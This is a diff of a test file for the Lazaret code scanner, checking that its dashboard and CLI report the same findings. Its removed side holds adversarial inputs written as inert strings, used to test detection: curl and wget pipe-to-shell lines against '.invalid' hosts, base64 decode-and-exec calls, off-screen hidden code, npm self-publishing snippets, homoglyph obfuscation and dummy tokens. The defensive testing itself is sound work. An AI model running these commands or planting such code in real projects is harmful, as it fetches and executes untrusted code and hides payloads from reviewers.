@@ -1,508 +1,173 @@
-"""Dashboard <-> CLI parity: the same input gives the same findings.
+"""Dashboard <-> CLI parity: the page reports what the CLI reports for the same files.
 
-The dashboard (lazaret/web/lazaret.html) carries its own copy of the scan
-engine — a port of the npm engine, which tests/architecture/test_js_parity.py
-keeps in step with the Python engine — and it drifted from the CLI
-unnoticed before (per-file budget, no size limit, no review fixes). This runs
-the page's script in node:vm (_dashboard_vm.py) and lazaret.scanner.core on
-the same inputs and compares EVERY field of every finding (rule, line,
-severity, type, name, message, why/fix/ref, snippet, snipStart):
+Since BR-7 step 5 the dashboard (lazaret/web/lazaret.html) runs the npm package's collection, scan and grading on
+the engine it carries, the CLIs' own (until then it carried a port of the npm engine, kept in step by tests of
+every rule, its tables and its decoding, and it drifted all the same). So what is held here is the page as a whole:
+the files picked in its upload control (or the code pasted into it) give the result `lazaret` gives for a directory
+holding them, lazaret.scanner.core's project scan, every field of it and of every finding (but the page's file
+list and time, and the CLI's project path and time):
 
-* every fixture source file (walked, so a new fixture is compared without
-  being listed) and the page's own "Load sample" inputs;
-* ADVERSARIAL text inputs for the review fixes (FIX-SPEC 1 comment lexer,
-  2 suppression markers, 5 Unicode and S-BIDI, 6 redaction, 7 caps and
-  snippets, 12 taint idioms, 13 multi-line decode->execute, the linear
-  rewrites of the quadratic SQL / except-pass / function-header patterns,
-  the obfuscation heuristics) and every taint case of test_taint_fstrings
-  and test_taint_frameworks, and test_taint_owasp's (Q-2);
-* UPLOADS: raw bytes through the page's upload path (FIX-SPEC 4 BOM / UTF-16
-  sniff with the plausibility check for a BOM-less guess, 15 PEP 263
-  cookies incl. UTF-7 -> SC-UTF7) against core.decode_source +
-  encoding_issues + scan_file;
-* the report for a set of files (metrics, counts, ratings, gate) against
-  core.build_result.
+* the fixture projects (tests/fixtures: each a scan, its tree uploaded as paths; the trees the CLI's walk prunes
+  are left out, as the page has no walk) and the page's own "Load sample" inputs, pasted;
+* uploads the CLI's collection reads each its own way: encodings (UTF-16 with and without a BOM, coding cookies,
+  CRLF), a .pth file, a .pyw script, Go and Rust sources (N-14), a script without an extension, a program under a
+  source file's name, an image, a video named .ts, an AppleDouble file, a config file holding a credential, an
+  empty file, a name outside ASCII;
+* a control: a page that grades differently is caught.
 
-Out of scope: what the page doesn't do (manifests, binaries, directory
-walking, dependency mode, the cross-file flow engine). Every codec a cookie
-can name is compared in test_review_codecs (single-byte codecs decode with
-Python's tables; the others the page cannot decode are SC-TRUNCATED in both).
-All content is inert: nothing is executed, hosts are TEST-NET or .invalid,
-credentials are dummies.
+Not compared: what the page does not do (a directory walk: links, unreadable entries, pruned trees, dependency
+trees; following a package.json's install hooks into the files they run), and its size limit
+(test_review_dashboard_limits). All content is inert: nothing is executed, hosts are TEST-NET or .invalid, the
+credential is a dummy built in pieces (test_fixture_credentials).
 """
 
-import base64
-import collections
-import hashlib
-import json
 import os
 import tempfile
 import unittest
 
-from lazaret.scanner import core
 from tests import _support
-from tests.registry._review_support import B64_DATA, DATA_B64, FAKE_WASM_B64
 from tests.scanner import _dashboard_vm as dash
 
-LANGS = {".py": "py", ".js": "js", ".sql": "sql"}
+#: the trees of the fixture projects the CLI's walk prunes (core.OPTIN_SKIP_DIRS, dot-directories), left out here
+PRUNED = {"dist", "migrations", "build", "node_modules", "venv", ".venv", "env"}
 
 
-def _one_class(n):
-    """n hex digits that do not repeat a period (SHA-256 of the counting numbers)."""
-    return "".join(hashlib.sha256(str(i).encode()).hexdigest() for i in range(n // 64 + 2))[:n]
-
-
-def fixture_files():
-    """Every .py / .js / .sql file under tests/fixtures, as posix paths."""
+def fixture_projects():
+    """[(name, [(rel, bytes)])]: each fixture project's files, and the files at the fixtures' top as one more."""
     out = []
-    for root, dirs, files in os.walk(_support.FIXTURES):
-        dirs[:] = sorted(d for d in dirs if d != "__pycache__")
-        for name in sorted(files):
-            if os.path.splitext(name)[1] in LANGS:
-                out.append(os.path.relpath(os.path.join(root, name), _support.FIXTURES).replace(os.sep, "/"))
+    top = []
+    for entry in sorted(os.listdir(_support.FIXTURES)):
+        path = os.path.join(_support.FIXTURES, entry)
+        if os.path.isfile(path):
+            top.append((entry, _read(path)))
+            continue
+        files = []
+        for root, dirs, names in os.walk(path):
+            dirs[:] = sorted(d for d in dirs if d not in PRUNED and not d.startswith(".") and d != "__pycache__")
+            for name in sorted(names):
+                full = os.path.join(root, name)
+                files.append((os.path.relpath(full, path).replace(os.sep, "/"), _read(full)))
+        out.append((entry, files))
+    out.append(("fixtures", top))
     return out
 
 
-def read_fixture(rel):
-    with open(os.path.join(_support.FIXTURES, *rel.split("/")), encoding="utf-8") as f:
+def _read(path):
+    with open(path, "rb") as f:
         return f.read()
 
 
-# The page's own "Load sample" inputs: (page constant, file name, language).
-SAMPLES = [("SAMPLE_PY", "sample.py", "py"), ("SAMPLE_JS", "sample.js", "js"),
-           ("SAMPLE_SQL", "sample.sql", "sql")]
+def cookie(name, body):
+    return f"# coding: {name}\n".encode("ascii") + body.encode(name)
 
-PEM_LINE = "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n"
 
-# (file name, language, content) — text as pasted.
-ADVERSARIAL = [
-    # 0.1.9: S-EXEC-JS leaves out a call on a regex (the engine's scanfile.rs exec_js_regex); RUN stands for exec,
-    # so that Lazaret's scan of its own sources does not read these strings as calls
-    *[(name, "js", text.replace("RUN", "exec")) for name, text in (
-        ("regex_exec.js", "const RE = /a(b)/g;\nlet m;\nwhile ((m = RE.RUN(text))) use(m);\ndb.RUN(sql + where);\n"
-         "var re2 = RegExp('(' + x + ')', 'g') // why\n, n = 0;\nre2?.RUN(line);\nconst m2 = /a\\/b/g . RUN(s);\n"),
-        ("shell_exec.js", "const cp = require('child_process');\nconst d = /^[A-Za-z]:/i.RUN(p);\n"
-         "const re = new RegExp(x);\nre.RUN(line);\ncp.RUN(cmd);\nconfig.re.RUN(cmd);\nrunner?.RUN(cmd);\n"
-         "RUN('ls ' + dir);\nlet r = /x/;\nr &&= cp;\nr.RUN(cmd);\nconst q = /x/\n  && cp;\nq.RUN(cmd);\n"
-         "x = \"(/\" + 1 /ig.RUN(cmd);\nconst ig = cp;\n"),
-        ("computed_require.js", "const m = require(name);\nm.RUNSync(cmd);\nconst w = /x/;\nw.RUN(s);\n"
-         "require('./run').RUN(cmd);\nconst c = require('child_' + 'process');\nc.RUN(cmd);\n"))],
-    # 0.1.8: code hidden off-screen (CRITICAL, MAJOR, and in a string or comment: none) and self-publishing code
-    ("offscreen.js", "js", "module.exports = 1;\n});" + " " * 300 + "global['r']=require;(function(){r('x')})();\n"
-     "const a = 2;" + " " * 200 + "a.b = [1, 2];\nconst s = '" + " " * 200 + "require(1)';\n// " + " " * 200
-     + "eval(x)\n\U0001F600;" + " " * 160 + "atob(q)\n"),
-    ("offscreen.py", "py", "x = 1\n)" + " " * 515 + ";import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n"
-     '"""\n' + " " * 200 + 'import os\n"""\ny = 2  # ' + " " * 200 + "import os\n"),
-    ("auto.js", "js", "const fs = require('fs');\nconst { exec } = require('child_process');\n"
-     "packageData.name = `${pick()}-sluey`;\nfs.writeFileSync('package.json', JSON.stringify(packageData, null, 2));\n"
-     "exec('npm publish --access public', () => {});\n"),
-    ("republish.py", "py", "import json, subprocess\npkg['name'] = 'x-' + str(n)\n"
-     "with open('package.json', 'w') as f:\n    json.dump(pkg, f)\nsubprocess.run(['npm', 'publish'])\n"),
-    ("release.js", "js", "pkg.version = next;\nfs.writeFileSync('package.json', JSON.stringify(pkg));\nexecSync('npm publish');\n"),
-    # 0.1.3: indirect eval, names hidden in a few escapes, an inline os import, .mts/.cts
-    ("indirect.js", "js", "(0, eval)(atob(p));\neval.call(null, atob(p));\nwindow['ev' + 'al'](\n  atob(p));\n"
-     "Reflect.apply(globalThis.eval, null, [atob(p)]);\n(0, util_1.Function)(atob(p));\n"),
-    ("names.js", "js", 'var m = global["\\x72\\x65\\x71\\x75\\x69\\x72\\x65"]("child_process");\n'
-     'var u = "https:\\u002F\\u002Fexample.invalid";\nvar b = "\\x00\\x01\\x65val";\nvar e = `\\u{65}v\\x61l`;\n'),
-    ("inline_os.py", "py", "__import__('os').system(input())\nimportlib.import_module('os').popen(c)\n"),
-    ("esm.mts", "js", "const el = <HTMLInputElement>document.body;\n// eval(z)\neval(atob(p));\n"),
-    ("cjs.cts", "js", "const el = <T,>(x: T) => x;\n/* eval(z) */ eval(y);\n"),
-    ("pipe_shell.js", "js", 'const { execSync } = require("child_process");\nexecSync("curl -s https://collector.invalid/x | bash");\n'
-     "console.log('Install with: curl -fsSL https://sh.invalid/i.sh | sh');\n"),
-    ("pipe_shell.py", "py", "import subprocess\nsubprocess.run('wget -qO- https://files.invalid/i.sh | sh', shell=True)\n"),
-    ("lookalike.js", "js", "const \u0435val = eval;\n\u0435val(x);\nif (isAdm\u0456n) {}\nconst isAdmin = 1;\nconst v\u0430lue = 2;\neva\u200dl(y);\n"),
-    ("lookalike.py", "py", "\u0435val = eval\n\u0435val(input())\n"),
-    ("lookalike_regex.js", "js", "const re = /[\\uFF07\\uFF10]/;\nx = /[\u0430-\u044f]/;\n"
-     "var u = /^(?:(?:http[s\\u017F]?|ftp):\\/\\/)/i;\nconst ok = /^[a-zA-Z\u0430-\u044f]+$/.test(s);\n"
-     "const r = a / v\u0430lue / 2;\n"),
-    ("lookalike_strings.js", "js", "const s = 'it\\'s' + \u0435val(x) + 'y';\nconst t = `\n  v\u0430lue ${\u0435val(x)}\n`;\n"
-     'const q = "a\\\n\u0435val";\n'),
-    ("hidden_unicode.js", "js", "const s=v=>[...v].map(w=>w.codePointAt(0));\n"
-     "eval(Buffer.from(s(`\U0000FE00\U0000FE01\U0000FE09\U0000FE0C\U0000FE0F\U0000FE01\U0000FE04`)).toString());\n"
-     "const bare = `\U0000FE01\U0000FE02`;\n"),
-    # G-5: runs of digits, hex digits (after 0x or not) or letters alone, and short periods, are not base64 data
-    ("b64_plain.js", "js", "const h = '" + "fd0c71ecb7ed16a9" * 16 + "';\nconst x = '0x" + "E0A67598CD1B763B" * 14 + "';\n"
-     "const t = '" + "SundayMondayTuesdayWednesdayThursdayFridaySaturday" * 5 + "';\nconst d = '" + "1336927655" * 25
-     + "';\nconst p = '" + "01234567890ABCDEFGHIJK" * 10 + "';\nconst q = '" + "01234567890ABCDEFGHIJK" * 10 + "Zz';\n"
-     "const both = ['" + "ab" * 110 + "', '" + B64_DATA + "'];\n"),
-    # N-4: the base64 of a whole WebAssembly module, PNG, GIF or WAV is data; a payload behind a module's header is not
-    ("b64_data.js", "js", "".join(f"const {k} = '{v}';\n" for k, v in DATA_B64.items()) + f"const fake = '{FAKE_WASM_B64}';\n"),
-    # G-5's bound: one class up to 16,384 characters is passed over, one more is reported; a period never is
-    ("b64_bound.js", "js", "const h = '" + _one_class(16384) + "';\nconst k = '" + _one_class(16385) + "';\n"
-     "const x = '0x" + _one_class(16383) + "';\nconst p = '" + "Zm9v" * 5000 + "';\n"),
-    # N-23: a presentation selector repeated up to four times is no carrier; five, or two different, are
-    ("hidden_unicode_emoji.js", "js", "// \u2622\ufe0f\ufe0f hazmat\nconst a = '\u2620\ufe0f \ufe0f\ufe0f\ufe0f';\n"
-     "const b = `\ufe0f\ufe0f\ufe0f\ufe0f\ufe0f`;\nconst c = `\ufe0e\ufe0f`;\nconst d = '\ufe0e\ufe0e';\n"),
-    ("lookalike_strings.py", "py", 'def f():\n    """\n    v\u0430lue\n    """\n    return \u0435val(x)\n'
-     "s = 'it\\'s' + \u0435val(x) + 'y'\nx = f'{\u0435val(p)}'\n"),
-    # FIX-SPEC 1: comment state across lines; U+2028/U+2029 end JS lines
-    ("blockcomment.js", "js", "/*\n eval(x)\n*/\n/**/eval(y)\n"),
-    ("comments.js", "js", "/* start\n * eval(a)\n */ eval(b)\n  * eval(c)\nconst r = /\\/*/; eval(d)\n"
-     "x = a / b; eval(e) // ok */\nvar q = /[/*]/;\neval(f)\n// */\n"),
-    ("template.js", "js", "const q = `${a}\n/* not a comment */ eval(x)\n`;\neval(y)\n"),
-    ("banner.js", "js", '/*! lib v1 | MIT */!function(){var k="A";eval(atob("Y29uc29sZS5sb2coMSk="));'
-     'require("child_process").exec(process.argv[2]);}();\n'),
-    ("separators.js", "js", "a = 1\u2029eval(b)\u2028// c\n// note\u2028eval(atob(p))\n"),
-    ("separators.py", "py", "a = 1\u2028eval(b)\n"),
-    ("comments.sql", "sql", "SELECT '-- nosec' FROM t; GRANT ALL ON x TO y;\n/* multi\nGRANT ALL ON z TO PUBLIC; */\n"
-     "SELECT \"a\n-- b\" FROM t;\n/* x */ GRANT ALL ON db.* TO PUBLIC;\n"),
-    ("comments.py", "py", 'HELP = """Usage:\n# not a comment"""\nx = 1  # trailing\n  # full\ns = "#"; eval(s)\n'),
-    ("untokenizable.py", "py", 'def f(:\n    HELP = """\n# in string\neval(x)\n"""\n  # real\n'),
-    # FIX-SPEC 2: suppression markers
-    ("suppressed.py", "py", "import os\nos.system(cmd)  # nosec - reviewed\n"),
-    ("tricks.js", "js", "eval(atob(p)); // nosec\neval(y); const s = '// nosec';\n-- nosec\neval(z)\n"
-     "eval(w); // lazaret-ignore: S-NEWFUNC, S-EVAL-JS\n/**/eval(v)\n// c\u2028eval(u)\n"
-     "const t = `\n// nosec\n`; eval(t)\neval(r) // NOSONAR: reason\n"),
-    ("tricks.py", "py", 'x = "# nosec"; eval(y)\ns = """\n# nosec\n"""\neval(z)\neval(w)  # nosec - reviewed\n'
-     "os.system(a) --nosec\nos.system(b)  # lazaret-ignore: S-OSCMD-PY\nos.system(c)  # lazaret-ignore: S-EVAL-PY\n"
-     "# nosec: S-OSCMD-PY, T-CMD\nos.system(d)\nexec(compile(s))  # nosec\n"),
-    ("tricks.sql", "sql", "-- nosec\nGRANT ALL ON t TO PUBLIC;\nGRANT SELECT ON t TO PUBLIC;\n"
-     "SELECT '-- nosec'; GRANT ALL ON u TO v;\n"),
-    ("crlf.py", "py", "eval(a)  # nosec\r\neval(b)\r\n# nosec\r\neval(c)\r\n"),
-    ("cr.js", "js", "eval(a) // NOSONAR\reval(b)\r"),
-    # FIX-SPEC 5 and 12: Unicode, S-BIDI, taint idioms
-    ("bidi.js", "js", 'const s = "\u202e";\nconst ok = 1; // \u202e } \u2066\n'),
-    ("bidi.py", "py", "s = '\u2067'\n# \u202a\n"),
-    ("bidi.sql", "sql", "SELECT 1; -- \u2069\n"),
-    ("unicode.py", "py", "caf\u00e9 = request.args['x']\nos.system(caf\u00e9)\nx: str = request.args['q']\nos.system(x)\n"
-     "\uff45val(n)\nimport os\nos.\uff53ystem(y)\n"),
-    ("unicode.js", "js", "const na\u00efve = req.query.q;\nexec(na\u00efve);\nconst { a, b: c } = req.query;\nexec(c);\n"
-     "\\u0065val(x)\neval\ufeff(y)\nconst [d, , e = 1, ...f] = req.body;\nexec(f);\n\\u{65}val(z)\n'\\u0065val(s)'\n"),
-    ("annotated.py", "py", "match: int = request.args['m']\ncase = 1\n_ : str = input()\nos.system(_)\n"
-     "if x: y = request.form['a']\nos.system(y)\nos.system(match)\n"),
-    ("emoji.js", "js", "const s = '" + "\U0001F600" * 150 + "'; eval(x)\n"),
-    # FIX-SPEC 7: caps (Q-CAPPED at the first omitted line) and snippets
-    ("capped.js", "js", "".join(f"var a{n} = 1;\n" for n in range(250))),
-    ("many.js", "js", "// TODO x\n" * 500 + "console.log(a)\n" * 250 + "eval(a)\n" * 600
-     + 'Function(Buffer.from(p,"base64").toString())()\n'),
-    ("interleaved.py", "py", "".join(f"x{n} = 1  # TODO {n}\n" for n in range(210)) + "import xml.etree\n" * 3),
-    ("long.js", "js", "x = 1; " * 700 + "eval(q);" + " y = 2;" * 700 + "\n" + "z" * 300 + "\n"),
-    ("functions.js", "js", "".join("function f%d(a) {\n%s}\n" % (n, "  if (a) { b(); }\n" * 14) for n in range(3))
-     + "const g = async (x) => {\n" + "  x && y || z;\n" * 70 + "};\n"),
-    ("functions.py", "py", "def outer():\n" + "    if x and y or z:\n        pass\n" * 40
-     + "    def inner():\n        return 1\n" + "    x = 1\n" * 30 + "async def h():\n    try:\n        a()\n    except:\n        pass\n"),
-    # FIX-SPEC 6: redaction of every snippet line and the message
-    ("keys.py", "py", 'token = "gho_' + "a1B2" * 9 + '"\napi_key = "Zq8vN3pL0wX7rT2mK9sB"  # example_user\n'
-     'tok = "Zq8vN3pL0wX7rT2mK9sB4hF6"  # latest\nu = "https://admin:s3cretPassw0rd@192.0.2.10/db"\neval(u)\n'),
-    ("creds.sql", "sql", "create user bob identified by 'hunter2hunter2';\nGRANT ALL ON t TO PUBLIC;\n"
-     "alter user x password = 'abcd1234';\nGRANT SELECT ON t TO PUBLIC;\n"),
-    ("markup.jsx", "js", '<Input password="hunter2hunter2" />\neval(x)\n'),
-    ("pem.py", "py", 'K = """-----BEGIN RSA PRIVATE KEY-----\n' + PEM_LINE * 3 + '-----END RSA PRIVATE KEY-----"""\n'
-     'eval(x)\nH = "-----BEGIN OPENSSH PRIVATE KEY-----"\neval(y)\n'),
-    ("pem.js", "js", 'k = "-----BEGIN EC PRIVATE KEY-----' + PEM_LINE.strip() + '-----END EC PRIVATE KEY-----"; eval(k)\n'),
-    # S-TOKEN-PEM: a header counts only with its key right after it (on its line past a string's separators, or at
-    # the start of the next line that holds anything), and past one without, the line's other tokens are read
-    ("pem_jose.js", "js", 'async function E(e){if(0!==e.indexOf("-----BEGIN PRIVATE KEY-----"))throw new TypeError("x")}'
-     'var t="' + PEM_LINE.strip() + '",k="AKI' + 'AQWERTYUIOPASDFGH";\nconst H = "-----BEGIN PRIVATE KEY-----"\n'
-     'const p = "src/runtime/node/key/import/pkcs8/whatever/aaaaaaaa"\n'),
-    ("pem_strings.js", "js", "const j = '-----BEGIN PRIVATE KEY-----\\\\n' +\n  '" + PEM_LINE.strip() + "';\n"
-     "const k = `-----BEGIN RSA PRIVATE KEY-----\\n" + PEM_LINE.strip() + "`;\n"),
-    ("pem_lines.py", "py", 'K = [\n    "-----BEGIN RSA PRIVATE KEY-----",\n    "' + PEM_LINE.strip() + '",\n]\n'
-     "# -----BEGIN PRIVATE KEY-----\n# " + PEM_LINE + 'E = """-----BEGIN RSA ' 'PRIVATE KEY-----\n' 'Proc-Type: 4,ENCRYPTED\n'
-     'DEK-Info: AES-128-CBC,0123456789ABCDEF\n\n' + PEM_LINE + '"""\nF = """-----BEGIN RSA PRIVATE KEY-----\n\n\n'
-     + PEM_LINE + '"""\nG = "-----BEGIN RSA ' 'PRIVATE KEY-----\\nProc-Type: 4,ENCRYPTED\\nDEK-Info: AES-128-CBC,0123\\n"\n'
-     'H = "-----BEGIN RSA PRIVATE KEY-----\\n" \\\n    "' + PEM_LINE.strip() + '\\n"\n'
-     '$k = "-----BEGIN PRIVATE KEY-----\\n" .\n    "' + PEM_LINE.strip() + '";\n'
-     'B = (\n    b"-----BEGIN PRIVATE KEY-----\\n"\n    b"' + PEM_LINE.strip() + '\\n"\n)\n'),
-    ("tokens.js", "js", 'const t = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc";\neval(t)\n'
-     'const g = "github_pat_' + "A1b2" * 7 + '";\neval(g)\nconst s = "' + "eyJ" * 50 + '";\n'),
-    ("tokens.py", "py", 'a = "AKI\x41IOSFODNN7ABCDEFG"\nb = "xox\x62-1234567890-abcdef"\nc = "sk_live_' + "a1" * 10 + '"\n'
-     'd = "AIza' + "B" * 35 + '"\ne = "ghp_' + "x" * 36 + '"\nlit = "Aq3vN5mR1tY7wK2pL9xB4cJ6hF0dS"\n'
-     'print("Aq3vN5mR1tY7wK2pL9xB4cJ6hF0dS")\n'),
-    ("entropy.js", "js", 'const k = "q8Z3vN5mR1tY7wK2pL9xB4cJ6hF0dS"; // test\nconst path = "/usr/local/lib/node_modules/x";\n'
-     'const ok = "CamelCaseIdentifierOnlyLetters";\nconst sample = "q8Z3vN5mR1tY7wK2pL9xB4cJ6hF0dT";\n'),
-    # the linear rewrites of the quadratic patterns
-    ("nowhere.sql", "sql", "DELETE FROM a;\nDELETE FROM b WHERE x = 1;\nUPDATE c SET d = 1;\nUPDATE e SET f = 1 WHERE g;\n"
-     "DELETE FROM h\n  -- comment\n;\nupdate [i] set j = 2;\nDELETE FROM k WHERE\n" + "DELETE FROM x " * 50 + "\n"),
-    ("dynamic.sql", "sql", "EXEC(@sql + @x);\nEXECUTE IMMEDIATE 'SELECT ' || v;\nEXEC sp_executesql N'x' + @y;\n"
-     "EXEC('SELECT ' + @z);\nSET @q = 'a' + @b;\nSET @r = @s;\nSET @t = 'x'; SET @u = 1 + 2;\n"
-     + "SET @a = '" * 30 + "\n"),
-    ("grant.sql", "sql", "GRANT SELECT ON a TO bob; GRANT ALL ON b TO PUBLIC;\nGRANT SELECT\nON c TO PUBLIC;\n"
-     "REVOKE x FROM y TO PUBLIC;\n" + "GRANT " * 40 + "\n"),
-    ("misc.sql", "sql", "SELECT * FROM t WITH (NOLOCK);\nSET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;\n"
-     "SET FOREIGN_KEY_CHECKS = 0;\nALTER DATABASE d SET TRUSTWORTHY ON;\nSELECT * FROM OPENROWSET('x');\n"
-     "LOAD DATA INFILE 'f';\nEXEC xp_cmdshell 'dir';\n-- TODO: fix\n"),
-    ("except.py", "py", "try:\n    x()\nexcept:\n    pass\ntry:\n    y()\nexcept ValueError as e:  \n\n    pass\n"
-     "except " * 30 + "\n" + "except:" + "\n" * 20 + "pass\n"),
-    ("headers.js", "js", "a(" * 50 + "\n" + "x" * 3000 + "(b) {\n}\nfoo(a) {\n  if (a) {}\n}\n"),
-    ("yaml.py", "py", "yaml.load(s)\nyaml.load(s, Loader=yaml.SafeLoader)\n" + "yaml.load(" * 20 + "SafeLoader\n"
-     "os.chmod(p, 0o777)\nos.chmod(p, 0o644)\n" + "chmod(" * 20 + "\n"),
-    # obfuscation and decode -> execute (FIX-SPEC 13, project mode)
-    ("hex.py", "py", "s = '\\x65\\x76\\x61\\x6c\\x28\\x61\\x74\\x6f\\x62\\x28\\x78\\x29\\x29'\n"
-     "b = b'\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08'\np = '\\x21\\x24\\x2a\\x2d\\x3a\\x3d\\x3f\\x5b\\x5d'\n"
-     "t = '\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64'\n"),
-    ("obfuscated.js", "js", "String.fromCharCode(101,118,97,108,40,97,116,111,98,40,120,41,41)\n"
-     "const _0x1a2b = 1, _0x3c4d = 2, _0x5e6f = 3, _0x7a8b = 4, _0x9c0d = 5;\n"
-     "const b = '" + B64_DATA + "';\n//# sourceMappingURL=data:application/json;base64," + "QUJD" * 60 + "\n"
-     "eval(function(p,a,c,k,e,d){return p})\n"),
-    ("decode.js", "js", "eval(\n  atob(p))\nFunction(globalThis.atob(q))()\nvm.runInThisContext(Buffer.from(z, 'base64'))\n"
-     "eval( // x\n  unescape(y)\n)\n"),
-    ("decode.py", "py", "exec(\n    base64.b64decode(s))\nexec(  # nosec\n    codecs.decode(t, 'rot13'))\n"
-     "exec(marshal.loads(b))\nexec(compile(src, 'x', 'exec'))\neval(bytes.fromhex(h))\n"),
-    # false positives from real registry scans: char codes counted per call,
-    # exec(compile(<source>)) is not bytecode, decode -> compile -> exec is
-    ("charcode.js", "js", "n+=String.fromCharCode(255&e),e>>>=8;x=12,y=34,z=56,w=78,v=90,u=11,q=22,r=33,s=44;\n"
-     "t+=String.fromCharCode(e>>>10&1023|55296);a=[10,20,30,40,50,60,70,80,90,99,11]\n"
-     "var s=String.fromCharCode(104,116,116,112,115,58,47,47,101,120,97);\n"
-     "var k=[104,116,116,112,115,58,47,47,101,120,97];x=String.fromCharCode.apply(null,k);\n"
-     "a=String.fromCharCode(e);" + "f(x);" * 600 + "b=String.fromCharCode(...[104,116,116,112,115,58,47,47,101,120,97]);\n"),
-    ("charcode-table.js", "js", "var T=[104,116,116,112,115,58,47,47,101,120,97];s+=String.fromCharCode(e>>>10&1023|55296);"
-     "x=12,y=34,z=56,w=78,v=90,u=11,q=22,r=33,s=44,t=55,o=66;\n"
-     "var k=[104,116,116,112,115,58,47,47,101,120,97];x=String.fromCharCode(...k.map(c=>c^1));\n"
-     'x=String.fromCharCode(f("' + "\U0001F600" * 3000 + '"),104,116,116,112,115,58,47,47,101,120,97);\n'),
-    ("compile.py", "py", "exec(compile(path.read_bytes(), str(path), 'exec'), ns)\n"
-     "exec(compile(base64.b64decode(x), '<s>', 'exec'))\nexec(compile(zlib.decompress(b), 'f', 'exec'))\n"
-     "code = marshal.load(fh)\nexec(__import__('marshal').loads(b))\nc = types.CodeType(0)\n"
-     "m = imp.load_compiled('x', 'x.pyc')\n"),
-    # taint, sanitizers, the SQL-sink analyzer
-    ("taint.py", "py", "import os, shlex\nx = request.args['x']\nos.system(shlex.quote(x))\nos.system(x)\n"
-     "n = int(request.args['n'])\ncur.execute('SELECT %s' % n)\nopen(os.path.basename(x))\nredirect(x)\n"
-     "requests.get(x)\nrender_template_string(x)\nq = 'SELECT * FROM t WHERE a = %s' % x\ncur.execute(q)\n"
-     "cur.execute('SELECT 1 WHERE a=%s', (x,))\ns = 'SELECT ' + x\ns += ' FROM t'\ncur.execute(s)\n"
-     "f = f'SELECT {x}'\ncur.executemany(f)\ncur.execute(\"x\".format(y))\n"),
-    ("taint.js", "js", "const x = req.query.x;\nexec(shellQuote(x));\nexec(x);\nconst n = parseInt(req.query.n);\n"
-     "db.query('SELECT ' + n);\ndb.query(db.escape(x));\nres.sendFile(path.basename(x));\nfetch(x);\nres.redirect(x);\n"
-     "el.innerHTML = DOMPurify.sanitize(x);\nel.innerHTML = x;\ndocument.write(location.hash);\nnew Function(x)();\n"
-     "fs.readFileSync(x);\nlet a = req.body.a, b = 2;\nconst c = a + '1';\neval(`${c}`);\nvar e = process.argv[2];\nspawn(e);\n"),
-    # the other rules, per language
-    ("rules.js", "js", "if (a == b) {}\nif (a != null) {}\nconst s = 'a == b';\nsetTimeout(\"alert(1)\", 10);\n"
-     "localStorage.setItem('jwt', t);\njwt.verify(t, k, { algorithms: ['none'] });\n"
-     "res.set('Access-Control-Allow-Origin', '*');\nconst u = 'http://example.invalid';\ncrypto.createHash('md5');\n"
-     "crypto.createCipheriv('des-ede3', k, iv);\nobj['__proto__'] = 1;\ndb.find({ $where: 'x' });\nrequire('vm');\n"
-     "spawn('ls', [], { shell: true });\nel.outerHTML = s;\n<div dangerouslySetInnerHTML={x} />\n"
-     "const token = Math.random();\nvar z = 1;\ntry { a() } catch (e) {}\ntry { b() } catch {\n}\n"),
-    ("rules.py", "py", "import pickle, yaml, hashlib, tempfile, os\nfrom xml.etree import ElementTree\nimport telnetlib\n"
-     "pickle.loads(d)\nhashlib.md5(b)\ntempfile.mktemp()\nrequests.get(u, verify=False)\n"
-     "app.run(debug=True, host='0.0.0.0')\nsubprocess.run(c, shell=True)\nmark_safe(s)\nEnvironment(autoescape=False)\n"
-     "client.set_missing_host_key_policy(AutoAddPolicy())\nDES.new(k)\nAES.new(k, AES.MODE_ECB)\n"
-     "secret_key = random.randint(0, 9)\nssl._create_unverified_context()\n" + "z = 1 " * 30 + "\n"),
-    ("empty.py", "py", ""),
-    ("blank.js", "js", "\n\n   \n" + " " * 200 + "\n"),
-]
+SECRET = "Tq8vN3pL0wX7rT2mK9sB" + "4hF6jD1aE5cGzY0uWx3R"              # a made-up key, in pieces
 
-# (file name, raw bytes) — uploads; the language comes from the extension.
+#: (name, [(rel, bytes or text)]): uploads the CLI's collection reads each its own way
 UPLOADS = [
-    ("le_bom.js", b"\xff\xfe" + "eval(a)\n".encode("utf-16-le")),
-    ("be_bom.js", b"\xfe\xff" + "eval(b)\n".encode("utf-16-be")),
-    ("le_nobom.js", "eval(c)\n".encode("utf-16-le")),
-    ("be_nobom.py", "eval(c)\nimport os\n".encode("utf-16-be")),
-    ("u8bom.py", b"\xef\xbb\xbf" + b"eval(d)\n"),
-    ("utf7.py", b"# -*- coding: utf-7 -*-\n# harmless comment +AAo-eval(e)\n"),
-    ("utf7_line2.py", b"#!/usr/bin/env python\n# vim: set fileencoding=UTF_7 :\nx = 1 # +AAo-os.system(x)\n"),
-    ("latin1.py", b"# coding: latin-1\ns = '\xe9'\neval(f)\n"),
-    ("cp1252.py", b"# coding=cp1252\ns = '\x93quoted\x94'\neval(f)\n"),
-    ("sjis.py", "# coding: shift_jis\ns = '\u65e5\u672c'\neval(i)\n".encode("shift_jis")),
-    ("unknown.py", b"# coding: no-such-codec\neval(g)\n"),
-    ("utf8_cookie.py", b"# coding: utf-8\neval(g)\n"),
-    ("cookie_line3.py", b"x = 1\ny = 2\n# coding: latin-1\neval(h)\n"),
-    ("cookie_in_js.js", b"// coding: latin-1\neval('\xe9')\n"),
-    ("nul_utf8.js", b"/*\x00*/eval(x)\n" + b"const a = 1;\n" * 5),     # not UTF-16: implausible
-    ("nul_only.js", b"\x00"),
-    ("crlf.py", b"eval(a)  # nosec\r\neval(b)\r\n"),
-    ("invalid_utf8.js", b"eval(\xff\xfe)\nconst s = '\xc3\x28';\n"),
-    ("odd_length.js", b"\xff\xfe" + "eval(q)\n".encode("utf-16-le") + b"\x00"),
-    ("utf16_sql.sql", b"\xff\xfe" + "GRANT ALL ON t TO PUBLIC;\n".encode("utf-16-le")),
+    ("utf-16 with a BOM", [("u16.py", "\ufeffimport os\nos.system(input())\n".encode("utf-16-le"))]),
+    ("utf-16 without one", [("u16n.py", "import os\nos.system(input())\n".encode("utf-16-le"))]),
